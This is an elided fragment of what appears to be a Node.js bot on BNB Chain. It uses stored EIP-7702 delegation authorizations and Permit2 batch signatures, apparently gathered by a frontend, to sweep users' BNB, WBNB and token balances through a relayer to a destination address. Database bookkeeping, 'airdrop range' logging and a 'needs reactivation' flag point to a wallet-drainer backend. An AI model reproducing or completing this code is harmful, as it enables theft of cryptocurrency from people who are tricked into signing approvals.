...
// No hardcoded API keys: Alchemy/custom fallback only applies if actually
...
async function tryUpgradeToEip7702AndSweep(checksum, short, addrKey) {
  ...
  // Read the EIP-7702 authorization from delegated_wallets
  let dwRow;
  try {
  ...
  } catch { /* non-fatal — proceed to install */ }
  ...
  try {
    ...
    const tx = await _baseRelayer.sendTransaction({
      ...
      data:     "0x",
      gasLimit: 100_000n,
      chainId:  Number(BNB_NETWORK.chainId),
      authorizationList: [{
    ...
    if (isRpc) {
      warn(`[upgrade] ${short} — type-4 transient RPC error (will retry on next trigger): ${e.message}`);
    } else {
            ...
            try {
              ...
              try {
                ...
                if (actualAllow === 0n) {
                  ...
                  tokenAllowances.set(tokenAddr.toLowerCase(), actualAllow);
                }
    ...
    for (const perm of batch.permitted) {
      ...
      try {
        ...
        if (balance > 0n && allow === 0n) {
          log(`[gasless/batch] ${tokenAddr.slice(0,10)}: balance=${balance} but no Permit2 approval — zeroing out`);
          needsGasTokens.push({ token: tokenAddr, balance });
        }
...
// (address(this).balance), not BNB in the user's wallet. The flow is:
//   user sends BNB → TCN_CONTRACT_ADDRESS → bot calls sweepETHFor(user)
//   → contract wraps to WBNB → forwards WBNB to destination.
//
// This is called ONLY when the contract itself has a BNB balance AND the user
// has called authorize(relayer) on the contract.

async function trySweepNativeFor(checksum, short) {
  if (!contract || !CONTRACT_ADDRESS) return;
  try {
    // ── A. Contract-held BNB (PATH 2 — sweepETHFor) ───────────────────────────
    ...
    // ── B. User-wallet BNB surplus (permit2-gasless path) ─────────────────────
    ...
    if (userBal > NATIVE_WRAP_CEILING) {
      // Large balance in user's own EOA — bot cannot move it without EIP-7702.
      // Tier 1.5 (tryUpgradeToEip7702AndSweep) handles this if an auth sig is stored.
      log(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} BNB exceeds ceiling (${ethers.formatEther(NATIVE_WRAP_CEILING)}) — native sweep needs EIP-7702 (Tier 1.5 handles it)`);
      return;
    }
    ...
    const wbnbBal = await wbnbContract.balanceOf(checksum).catch(() => 0n);
    if (wbnbBal > 0n) {
      log(`[nativeFor] ${short} — user has ${ethers.formatEther(wbnbBal)} WBNB and ${ethers.formatEther(userBal)} BNB — WBNB sweep will handle it`);
      return;
    }

    warn(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} BNB unwrapped (in airdrop range) — checking backup before flagging`);
    await setNeedsReactivationIfNoBackup(checksum, checksum.toLowerCase());
  } catch (e) {
    maybeResetNonce(e);
...
// Periodically checks if the TCN contract holds BNB (from PATH 2 users who
// sent BNB to the contract address). Calls sweepETHFor() for the first
// authorized PATH 2 user. Runs every 60s.
...
async function _contractEthPollTick() {
  ...
  try {
    ...
    log(`[contractEth] 📥 contract holds ${ethers.formatEther(contractBal)} BNB — finding authorized user`);
    const relBal = await getRelayerBalance();
...
async function sweep(wallet) {
  ...
  // If the frontend stored an EIP-7702 authorization, submit a type-4 tx to
  // install delegation code, then sweepAll() — covers native coins + tokens.
  // ══════════════════════════════════════════════════════════════════════════
      ...
      try {
        ...
        if (needsPermitCall3) {
          ...
          if (pb3SigDeadline === 0 || pb3SigDeadline < nowSecs3) {
            warn(`[allowance] permitBatch sigDeadline ${pb3SigDeadline === 0 ? 'missing/zero' : `expired ${Math.floor((nowSecs3 - pb3SigDeadline) / 86400)} days ago`} — skipping permit() call`);
          } else {
            const permitArgs = [
              checksum,
              {
            ...
            if (permitPreflightOk) {
              ...
              try {
                ...
                if ((peMsg.includes("nonce") || peMsg.includes("invalidsign") || peMsg.includes("revert")) && supabase) {
                  supabase.from("permit2_signatures").update({ spent: true })
                    .eq("address", addrKey).eq("chain", CHAIN)
  ...
  if (supabase) {
    ...
    // Source 1: permit2_signatures[address + "-sig"] — primary path (unspent only)
    {
      const { data } = await supabase
        ...
        .eq("chain", CHAIN)
        .or("spent.is.null,spent.eq.false")   // include NULL (pre-column rows) and explicit false
        .order("created_at", { ascending: false })
        .limit(1)
        .maybeSingle();
      if (data?.signature) {
